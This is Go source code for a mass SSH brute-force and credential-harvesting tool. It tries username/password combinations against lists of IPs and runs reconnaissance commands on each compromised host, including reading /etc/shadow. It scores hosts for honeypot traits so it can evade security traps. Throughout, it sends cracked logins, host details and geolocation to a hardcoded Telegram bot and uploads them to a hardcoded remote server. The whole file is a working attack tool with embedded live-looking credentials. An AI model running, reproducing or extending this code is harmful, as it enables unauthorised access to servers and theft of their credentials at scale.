package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"golang.org/x/crypto/ssh"
)

var startTime time.Time
var totalIPCount int
var stats = struct{ goods, errors, honeypots int64 }{0, 0, 0}
var ipFile string
var timeout int
var maxConnections int

const VERSION = "2.7" // Version bumped
var (
	successfulIPs       = make(map[string]struct{})
	mapMutex            sync.Mutex
	botToken            = "8263323532:AAFxOOKjtvBLcKXsmvcWHwA_Z78ahZEVcTA"
	chatIDs             = []int64{-5114002631}
	concurrentPerWorker int
	apiConfig           = Config{
		APIEndpoint: "http://38.242.224.156:5190/upload",
		APIKey:      "phuvanduc",
		Timeout:     30,
	}
	successChan = make(chan Success, 200)
	honeypotChan = make(chan Success, 100)
)

type Config struct {
	APIEndpoint string
	APIKey      string
	Timeout     int
}

type IPInfo struct {
	IP      string `json:"ip"`
	City    string `json:"city"`
	Region  string `json:"region"`
	Country string `json:"country"`
	Org     string `json:"org"`
}

type Success struct {
	Info   *ServerInfo
	IPInfo IPInfo
}

type SSHTask struct {
	IP       string
	Port     string
	Username string
	Password string
}

type ServerInfo struct {
	IP              string
	Port            string
	Username        string
	Password        string
	IsHoneypot      bool
	HoneypotScore   int
	SSHVersion      string
	OSInfo          string
	Hostname        string
	ResponseTime    time.Duration
	Commands        map[string]string
	OpenPorts       []string
	CPUCores        int
	Architecture    string
	CPUModel        string
}

type HoneypotDetector struct {
	TimeAnalysis    bool
	CommandAnalysis bool
	NetworkAnalysis bool
}

func main() {
	if len(os.Args) != 7 {
		log.Fatal("Usage: go run test.go <user.txt> <pass.txt> <ip.txt> <delay> <low_thread> <max_thread>")
	}

	usernameFile := os.Args[1]
	passwordFile := os.Args[2]
	ipFile = os.Args[3]
	timeoutStr := os.Args[4]
	lowThreadStr := os.Args[5]
	maxConnectionsStr := os.Args[6]

	timeout, _ = strconv.Atoi(timeoutStr)
	concurrentPerWorker, _ = strconv.Atoi(lowThreadStr)
	maxConnections, _ = strconv.Atoi(maxConnectionsStr)

	createComboFile(usernameFile, passwordFile)
	fmt.Printf("IP file: %s, Timeout: %ds, Low Thread: %d, Max Thread: %d\n", ipFile, timeout, concurrentPerWorker, maxConnections)

	startTime = time.Now()

	combos := getItems("combo.txt")
	ips := getItems(ipFile)
	totalIPCount = len(ips) * len(combos)

	setupEnhancedWorkerPool(combos, ips)
	banner()
	fmt.Println("Operation completed successfully!")
}

func getItems(path string) [][]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file: %s", err)
	}
	defer file.Close()

	var items [][]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			items = append(items, strings.Split(line, ":"))
		}
	}
	return items
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func createComboFile(usernameFile, passwordFile string) {
	usernames := getItems(usernameFile)
	passwords := getItems(passwordFile)

	file, err := os.Create("combo.txt")
	if err != nil {
		log.Fatalf("Failed to create combo file: %s", err)
	}
	defer file.Close()

	for _, username := range usernames {
		for _, password := range passwords {
			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
		}
	}
}

func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
	commands := map[string]string{
		"hostname": "hostname", "uname": "uname -a", "whoami": "whoami", "pwd": "pwd",
		"ls_root": "ls -la /", "ps": "ps aux | head -10", "netstat": "netstat -tulpn | head -10",
		"history": "history | tail -5", "ssh_version": "ssh -V", "uptime": "uptime",
		"mount": "mount | head -5", "env": "env | head -10",
		"cpu_cores":  "nproc 2>/dev/null || (grep -c '^processor' /proc/cpuinfo 2>/dev/null) || echo 0",
		"arch":       "uname -m 2>/dev/null || echo unknown",
		"cpu_model":  "grep 'model name' /proc/cpuinfo 2>/dev/null | head -1 | cut -d ':' -f2- | sed 's/^ *//' | xargs || echo unknown",
	}

	for cmdName, cmd := range commands {
		output := executeCommand(client, cmd)
		serverInfo.Commands[cmdName] = output
		switch cmdName {
		case "hostname":
			serverInfo.Hostname = strings.TrimSpace(output)
		case "uname":
			serverInfo.OSInfo = strings.TrimSpace(output)
		case "ssh_version":
			serverInfo.SSHVersion = strings.TrimSpace(output)
		}
	}

	if coresStr, ok := serverInfo.Commands["cpu_cores"]; ok {
		if n, err := strconv.Atoi(strings.TrimSpace(coresStr)); err == nil {
			serverInfo.CPUCores = n
		}
	}
	serverInfo.Architecture = strings.TrimSpace(serverInfo.Commands["arch"])
	serverInfo.CPUModel = strings.TrimSpace(serverInfo.Commands["cpu_model"])

	serverInfo.OpenPorts = scanLocalPorts(client)
}

func executeCommand(client *ssh.Client, command string) string {
	session, err := client.NewSession()
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	defer session.Close()
	output, err := session.CombinedOutput(command)
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	return string(output)
}

func scanLocalPorts(client *ssh.Client) []string {
	output := executeCommand(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
	var ports []string
	lines := strings.Split(output, "\n")
	portRegex := regexp.MustCompile(`:(\d+)\s`)
	for _, line := range lines {
		matches := portRegex.FindAllStringSubmatch(line, -1)
		for _, match := range matches {
			if len(match) > 1 {
				port := match[1]
				if !contains(ports, port) {
					ports = append(ports, port)
				}
			}
		}
	}
	return ports
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *HoneypotDetector) bool {
	score := 0
	score += analyzeCommandOutput(serverInfo)
	if detector.TimeAnalysis {
		score += analyzeResponseTime(serverInfo)
	}
	score += analyzeFileSystem(serverInfo)
	score += analyzeProcesses(serverInfo)
	if detector.NetworkAnalysis {
		score += analyzeNetwork(client)
	}
	score += behavioralTests(client, serverInfo)
	score += detectAnomalies(serverInfo)
	score += advancedHoneypotTests(client)
	score += performanceTests(client)
	serverInfo.HoneypotScore = score
	return score >= 6
}

func analyzeCommandOutput(serverInfo *ServerInfo) int {
	score := 0
	for _, output := range serverInfo.Commands {
		lower := strings.ToLower(output)
		for _, term := range []string{"fake", "simulation", "honeypot", "trap", "monitor", "cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap"} {
			if strings.Contains(lower, term) {
				score += 3
			}
		}
	}
	return score
}

func analyzeResponseTime(serverInfo *ServerInfo) int {
	if serverInfo.ResponseTime.Milliseconds() < 10 {
		return 2
	}
	return 0
}

func analyzeFileSystem(serverInfo *ServerInfo) int {
	score := 0
	if output, ok := serverInfo.Commands["ls_root"]; ok {
		lower := strings.ToLower(output)
		for _, p := range []string{"total 0", "total 4", "honeypot", "fake", "simulation"} {
			if strings.Contains(lower, p) {
				score++
			}
		}
		if len(strings.Split(strings.TrimSpace(output), "\n")) < 5 {
			score++
		}
	}
	return score
}

func analyzeProcesses(serverInfo *ServerInfo) int {
	score := 0
	if output, ok := serverInfo.Commands["ps"]; ok {
		lower := strings.ToLower(output)
		for _, p := range []string{"cowrie", "kippo", "honeypot", "honeyd", "artillery", "honeytrap", "glastopf"} {
			if strings.Contains(lower, p) {
				score += 2
			}
		}
		if len(strings.Split(strings.TrimSpace(output), "\n")) < 5 {
			score++
		}
	}
	return score
}

func analyzeNetwork(client *ssh.Client) int {
	score := 0
	if out := executeCommand(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5"); len(strings.TrimSpace(out)) < 10 || strings.Contains(strings.ToLower(out), "total 0") {
		score++
	}
	if out := executeCommand(client, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5"); len(strings.TrimSpace(out)) < 10 || strings.Contains(strings.ToLower(out), "fake") {
		score++
	}
	if out := executeCommand(client, "ip route show 2>/dev/null | head -3"); len(strings.TrimSpace(out)) < 20 {
		score++
	}
	return score
}

func behavioralTests(client *ssh.Client, serverInfo *ServerInfo) int {
	score := 0
	tempFile := fmt.Sprintf("/tmp/test_%d", time.Now().UnixNano())
	if out := executeCommand(client, fmt.Sprintf("echo test > %s", tempFile)); strings.Contains(strings.ToLower(out), "error") || strings.Contains(strings.ToLower(out), "permission") {
		score++
	} else {
		executeCommand(client, fmt.Sprintf("rm -f %s", tempFile))
	}
	accessible := 0
	for _, f := range []string{"/etc/passwd", "/etc/shadow", "/proc/version"} {
		if out := executeCommand(client, fmt.Sprintf("cat %s 2>/dev/null | head -1", f)); len(out) > 0 && !strings.Contains(strings.ToLower(out), "error") {
			accessible++
		}
	}
	if accessible == 3 {
		score++
	}
	working := 0
	for _, cmd := range []string{"id", "whoami", "pwd"} {
		if out := executeCommand(client, cmd); len(out) > 0 && !strings.Contains(strings.ToLower(out), "error") {
			working++
		}
	}
	if working == 0 {
		score += 2
	}
	return score
}

func advancedHoneypotTests(client *ssh.Client) int {
	score := 0
	if out := executeCommand(client, "cat /proc/cpuinfo | grep 'model name' | head -1"); strings.Contains(strings.ToLower(out), "qemu") || strings.Contains(strings.ToLower(out), "virtual") {
		score++
	}
	if out := executeCommand(client, "uname -r"); strings.Contains(out, "generic") && len(strings.TrimSpace(out)) < 20 {
		score++
	}
	working := 0
	for _, cmd := range []string{"which apt", "which yum", "which pacman", "which zypper"} {
		if out := executeCommand(client, cmd); !strings.Contains(out, "not found") && len(strings.TrimSpace(out)) > 0 {
			working++
		}
	}
	if working == 0 {
		score++
	}
	if out := executeCommand(client, "systemctl list-units --type=service --state=running 2>/dev/null | head -10"); strings.Contains(out, "0 loaded") || len(strings.TrimSpace(out)) < 50 {
		score++
	}
	if out := executeCommand(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'"); len(strings.TrimSpace(out)) == 0 {
		score++
	}
	return score
}

func performanceTests(client *ssh.Client) int {
	score := 0
	if out := executeCommand(client, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1"); strings.Contains(out, "command not found") {
		score++
	}
	executeCommand(client, "rm -f /tmp/test")
	if out := executeCommand(client, "ss -tuln 2>/dev/null | wc -l"); out != "" {
		if n, err := strconv.Atoi(strings.TrimSpace(out)); err == nil && n < 5 {
			score++
		}
	}
	return score
}

func detectAnomalies(serverInfo *ServerInfo) int {
	score := 0
	if h := serverInfo.Hostname; h != "" {
		lower := strings.ToLower(h)
		for _, s := range []string{"honeypot", "fake", "trap", "monitor", "sandbox", "test", "simulation"} {
			if strings.Contains(lower, s) {
				score++
			}
		}
	}
	if out, ok := serverInfo.Commands["uptime"]; ok && (strings.Contains(out, "0:") || strings.Contains(out, "min")) {
		score++
	}
	if out, ok := serverInfo.Commands["history"]; ok && len(strings.Split(strings.TrimSpace(out), "\n")) < 3 {
		score++
	}
	return score
}

func getIPInfo(ip string) IPInfo {
	var info IPInfo
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get("https://ipinfo.io/" + ip + "/json")
	if err != nil {
		return info
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	json.Unmarshal(body, &info)
	return info
}

func createTelegramBot() *tgbotapi.BotAPI {
	for {
		bot, err := tgbotapi.NewBotAPI(botToken)
		if err == nil {
			return bot
		}
		log.Printf("Bot error: %v. Retrying...", err)
		time.Sleep(5 * time.Second)
	}
}

// === SEND SUCCESS BATCH ===
func sendSuccessBatch(batch []Success) {
	bot := createTelegramBot()
	for _, s := range batch {
		// Escape all dynamic data
		ip := html.EscapeString(s.Info.IP)
		port := html.EscapeString(s.Info.Port)
		user := html.EscapeString(s.Info.Username)
		pass := html.EscapeString(s.Info.Password)
		host := html.EscapeString(s.Info.Hostname)
		osInfo := html.EscapeString(s.Info.OSInfo)
		sshVer := html.EscapeString(s.Info.SSHVersion)
		ports := html.EscapeString(strings.Join(s.Info.OpenPorts, ", "))
		country := html.EscapeString(s.IPInfo.Country)
		region := html.EscapeString(s.IPInfo.Region)
		city := html.EscapeString(s.IPInfo.City)
		org := html.EscapeString(s.IPInfo.Org)
		cpuCores := strconv.Itoa(s.Info.CPUCores)
		arch := html.EscapeString(s.Info.Architecture)
		cpuModel := html.EscapeString(s.Info.CPUModel)

		msg := fmt.Sprintf(`<b>Made By TreTrauNetwork</b>

🔐 <b>SSH ACCESS REPORT</b>

🎯 <b>Target:</b> <code>%s:%s</code>
👤 <b>User:</b> <code>%s</code>
🔑 <b>Pass:</b> <code>%s</code>

🖥️ <b>Host:</b> %s
🧩 <b>OS:</b> %s
🔌 <b>SSH:</b> %s
⚡ <b>Time:</b> %v
🚪 <b>Ports:</b> %s
🧠 <b>CPU:</b> %s
🏗️ <b>Arch:</b> %s
💾 <b>Chip:</b> %s

🌍 <b>Country:</b> %s
📍 <b>Region:</b> %s
🏙️ <b>City:</b> %s
🏢 <b>Org:</b> %s
🪤 <b>Honeypot:</b> %d
⏰ <b>Timestamp:</b> %s`,
			ip, port, user, pass,
			host, osInfo, sshVer, s.Info.ResponseTime, ports, cpuCores, arch, cpuModel,
			country, region, city, org, s.Info.HoneypotScore,
			time.Now().Format("2006-01-02 15:04:05"))

		for _, id := range chatIDs {
			for {
				m := tgbotapi.NewMessage(id, msg)
				m.ParseMode = "HTML"
				if _, err := bot.Send(m); err == nil {
					break
				} else {
					log.Printf("Send failed: %v. Retrying in 3s...", err)
					time.Sleep(3 * time.Second)
				}
			}
		}
	}
}

// === SEND HIGH-SCORE HONEYPOT TO TELEGRAM + API ===
func sendHighScoreHoneypot(s Success) {
	bot := createTelegramBot()
	
	// Escape all dynamic data
	ip := html.EscapeString(s.Info.IP)
	port := html.EscapeString(s.Info.Port)
	user := html.EscapeString(s.Info.Username)
	pass := html.EscapeString(s.Info.Password)
	host := html.EscapeString(s.Info.Hostname)
	osInfo := html.EscapeString(s.Info.OSInfo)
	sshVer := html.EscapeString(s.Info.SSHVersion)
	ports := html.EscapeString(strings.Join(s.Info.OpenPorts, ", "))
	country := html.EscapeString(s.IPInfo.Country)
	region := html.EscapeString(s.IPInfo.Region)
	city := html.EscapeString(s.IPInfo.City)
	org := html.EscapeString(s.IPInfo.Org)
	cpuCores := strconv.Itoa(s.Info.CPUCores)
	arch := html.EscapeString(s.Info.Architecture)
	cpuModel := html.EscapeString(s.Info.CPUModel)
	score := s.Info.HoneypotScore

	msg := fmt.Sprintf(`<b>🚨 HIGH-SCORE HONEYPOT ALERT 🚨</b>

⚠️ <b>CRITICAL HONEYPOT DETECTED</b>

🎯 <b>Target:</b> <code>%s:%s</code>
👤 <b>User:</b> <code>%s</code>
🔑 <b>Pass:</b> <code>%s</code>

🖥️ <b>Host:</b> %s
🧩 <b>OS:</b> %s
🔌 <b>SSH:</b> %s
⚡ <b>Time:</b> %v
🚪 <b>Ports:</b> %s
🧠 <b>CPU:</b> %s
🏗️ <b>Arch:</b> %s
💾 <b>Chip:</b> %s

🌍 <b>Country:</b> %s
📍 <b>Region:</b> %s
🏙️ <b>City:</b> %s
🏢 <b>Org:</b> %s
🪤 <b>SCORE:</b> <b>%d/12</b> 🔥
⏰ <b>Timestamp:</b> %s`,
		ip, port, user, pass,
		host, osInfo, sshVer, s.Info.ResponseTime, ports, cpuCores, arch, cpuModel,
		country, region, city, org, score,
		time.Now().Format("2006-01-02 15:04:05"))

	// Send to Telegram
	for _, id := range chatIDs {
		for {
			m := tgbotapi.NewMessage(id, msg)
			m.ParseMode = "HTML"
			if _, err := bot.Send(m); err == nil {
				break
			} else {
				log.Printf("Honeypot Telegram send failed: %v. Retrying...", err)
				time.Sleep(3 * time.Second)
			}
		}
	}

	// Create honeypot file and upload to API
	honeypotLine := fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n", 
		s.Info.IP, s.Info.Port, s.Info.Username, s.Info.Password, score, s.Info.CPUCores)
	appendToFile(honeypotLine, "honeypots.txt")
	
	// Upload to API immediately
	if err := UploadFile(apiConfig, "honeypots.txt"); err != nil {
		log.Printf("High-score honeypot API upload failed: %v", err)
	} else {
		os.Truncate("honeypots.txt", 0)
		log.Printf("High-score honeypot (Score: %d) uploaded to API successfully", score)
	}
}

func successBatchProcessor(ch chan Success) {
	var batch []Success
	const size = 2
	const timeout = 20 * time.Second
	timer := time.NewTimer(timeout)
	timer.Stop()

	for {
		select {
		case s, ok := <-ch:
			if !ok {
				if len(batch) > 0 {
					sendSuccessBatch(batch)
				}
				return
			}
			batch = append(batch, s)
			if len(batch) >= size {
				sendSuccessBatch(batch[:size])
				batch = batch[size:]
				timer.Reset(timeout)
			} else if len(batch) == 1 {
				timer.Reset(timeout)
			}
		case <-timer.C:
			if len(batch) > 0 {
				sendSuccessBatch(batch)
				batch = nil
			}
		}
	}
}

func honeypotHighScoreProcessor(ch chan Success) {
	for s := range ch {
		sendHighScoreHoneypot(s)
	}
}

func honeypotSender() {
	ticker := time.NewTicker(15 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		if fileSize("honeypots.txt") > 0 {
			if err := UploadFile(apiConfig, "honeypots.txt"); err != nil {
				log.Printf("Upload failed: %v", err)
			} else {
				os.Truncate("honeypots.txt", 0)
				log.Println("Honeypots uploaded.")
			}
		}
	}
}

func UploadFile(cfg Config, path string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	body := &bytes.Buffer{}
	w := multipart.NewWriter(body)
	w.WriteField("key", cfg.APIKey)
	part, _ := w.CreateFormFile("file", filepath.Base(path))
	io.Copy(part, f)
	w.Close()

	req, _ := http.NewRequest("POST", cfg.APIEndpoint, body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	client := &http.Client{Timeout: time.Duration(cfg.Timeout) * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("status %d: %s", resp.StatusCode, string(b))
	}
	return nil
}

func fileSize(name string) int64 {
	info, err := os.Stat(name)
	if err != nil {
		return 0
	}
	return info.Size()
}

func banner() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	for range ticker.C {
		g, e, h := atomic.LoadInt64(&stats.goods), atomic.LoadInt64(&stats.errors), atomic.LoadInt64(&stats.honeypots)
		total := int(g + e + h)
		elapsed := time.Since(startTime).Seconds()
		speed := float64(total) / elapsed
		remain := float64(totalIPCount-total) / speed

		clear()
		fmt.Printf("File: %s | Timeout: %ds\n", ipFile, timeout)
		fmt.Printf("Workers: %d | Per: %d\n", maxConnections, concurrentPerWorker)
		fmt.Printf("Checked: %d/%d | Speed: %.2f/s\n", total, totalIPCount, speed)
		if total < totalIPCount {
			fmt.Printf("Elapsed: %s | Remain: %s\n", formatTime(int(elapsed)), formatTime(int(remain)))
		} else {
			fmt.Printf("Total: %s\n", formatTime(int(elapsed)))
		}
		fmt.Printf("Good: %d | Fail: %d | Honey: %d\n", g, e, h)
		if total >= totalIPCount {
			os.Exit(0)
		}
	}
}

func formatTime(sec int) string {
	d := sec / 86400
	h := (sec % 86400) / 3600
	m := (sec % 3600) / 60
	s := sec % 60
	return fmt.Sprintf("%02d:%02d:%02d:%02d", d, h, m, s)
}

func appendToFile(data, path string) {
	f, _ := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	f.WriteString(data)
}

func calculateOptimalBuffers() int {
	return int(float64(maxConnections*concurrentPerWorker) * 1.5)
}

func setupEnhancedWorkerPool(combos, ips [][]string) {
	buf := calculateOptimalBuffers()
	taskQ := make(chan SSHTask, buf)
	var wg sync.WaitGroup

	for i := 0; i < maxConnections; i++ {
		wg.Add(1)
		go enhancedMainWorker(i, taskQ, &wg)
	}

	go banner()
	go honeypotSender()
	go successBatchProcessor(successChan)
	go honeypotHighScoreProcessor(honeypotChan)

	go func() {
		for _, c := range combos {
			for _, ip := range ips {
				taskQ <- SSHTask{IP: ip[0], Port: ip[1], Username: c[0], Password: c[1]}
			}
		}
		close(taskQ)
	}()

	wg.Wait()
	close(successChan)
	close(honeypotChan)
}

func enhancedMainWorker(id int, q <-chan SSHTask, wg *sync.WaitGroup) {
	defer wg.Done()
	sem := make(chan struct{}, concurrentPerWorker)
	var inner sync.WaitGroup
	for t := range q {
		inner.Add(1)
		sem <- struct{}{}
		go func(task SSHTask) {
			defer inner.Done()
			defer func() { <-sem }()
			processSSHTask(task)
		}(t)
	}
	inner.Wait()
}

// === NEW FUNCTION: FILTER GARBAGE OUTPUT ===
func isValidShellResponse(info *ServerInfo) bool {
	// List of strings that indicate a "garbage" or broken shell response
	// typically found in restricted shells or banners
	badPhrases := []string{
		"invalid option",
		"Too many connection attempts",
		"Please try again later",
		"Copyright", // Often captures the banner legal text instead of hostname
		"WARRANTY",
		"Last login:", // Captures login msg instead of hostname
	}

	// 1. Check if Hostname or OSInfo contains these bad phrases
	lowerHost := strings.ToLower(info.Hostname)
	lowerOS := strings.ToLower(info.OSInfo)

	for _, phrase := range badPhrases {
		p := strings.ToLower(phrase)
		if strings.Contains(lowerHost, p) || strings.Contains(lowerOS, p) {
			return false
		}
	}

	// 2. Length check: Hostnames shouldn't be paragraphs
	// Real hostnames are usually short (e.g., "server1" or "ubuntu"). 
	// Garbage output like your example is very long.
	if len(info.Hostname) > 100 {
		return false
	}
	
	// 3. Newline check: A hostname command should return a single line.
	// If it returns multiple lines (after trimming), it's likely a banner.
	if strings.Count(strings.TrimSpace(info.Hostname), "\n") > 0 {
		return false
	}

	return true
}

func processSSHTask(t SSHTask) {
	cfg := &ssh.ClientConfig{
		User:            t.Username,
		Auth:            []ssh.AuthMethod{ssh.Password(t.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(timeout) * time.Second,
	}
	start := time.Now()
	client, err := ssh.Dial("tcp", t.IP+":"+t.Port, cfg)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer client.Close()

	info := &ServerInfo{
		IP:           t.IP,
		Port:         t.Port,
		Username:     t.Username,
		Password:     t.Password,
		ResponseTime: time.Since(start),
		Commands:     make(map[string]string),
	}

	detector := &HoneypotDetector{TimeAnalysis: true, CommandAnalysis: true, NetworkAnalysis: true}
	gatherSystemInfo(client, info)

	// === NEW: FILTER GARBAGE BEFORE PROCEEDING ===
	if !isValidShellResponse(info) {
		// Treat as error/ignore so it doesn't spam telegram
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	info.IsHoneypot = detectHoneypot(client, info, detector)

	// === NEW: SCORE 11 OVERRIDE ===
	// User requested that Score 11 be treated as usable/valid
	if info.HoneypotScore == 11 {
		info.IsHoneypot = false
	}

	key := t.IP + ":" + t.Port
	mapMutex.Lock()
	if _, ok := successfulIPs[key]; ok {
		mapMutex.Unlock()
		return
	}
	successfulIPs[key] = struct{}{}
	mapMutex.Unlock()

	ipinfo := getIPInfo(info.IP)

	if !info.IsHoneypot {
		atomic.AddInt64(&stats.goods, 1)
		line := fmt.Sprintf("%s:%s@%s:%s\n", info.IP, info.Port, info.Username, info.Password)
		appendToFile(line, "su-goods.txt")
		detailed := fmt.Sprintf(`Made By TreTrauNetwork
=== SSH ===
Target: %s:%s
Credentials: %s:%s
Hostname: %s
OS: %s
SSH Version: %s
Response Time: %v
Open Ports: %v
CPU Cores: %d
Architecture: %s
CPU Model: %s
Country: %s
Region: %s
City: %s
Org: %s
Honeypot Score: %d
Timestamp: %s
===========

`, info.IP, info.Port, info.Username, info.Password, info.Hostname, info.OSInfo, info.SSHVersion,
			info.ResponseTime, strings.Join(info.OpenPorts, ", "), info.CPUCores, info.Architecture, info.CPUModel,
			ipinfo.Country, ipinfo.Region, ipinfo.City, ipinfo.Org, info.HoneypotScore, time.Now().Format("2006-01-02 15:04:05"))
		appendToFile(detailed, "detailed-results.txt")
		successChan <- Success{Info: info, IPInfo: ipinfo}
		fmt.Printf("SUCCESS: %s\n", line[:len(line)-1])
	} else {
		atomic.AddInt64(&stats.honeypots, 1)
		log.Printf("Honeypot: %s:%s (Score: %d)", info.IP, info.Port, info.HoneypotScore)
		
		// NEW: Check for high-score honeypots (10 or 12, since 11 is now treated as Good)
		// and send to Telegram + API
		if info.HoneypotScore >= 10 {
			appendToFile(fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n", 
				info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
			honeypotChan <- Success{Info: info, IPInfo: ipinfo}
			return
		}
		
		// Regular honeypots (score < 10)
		appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d) CPU: %d\n", info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
	}
}
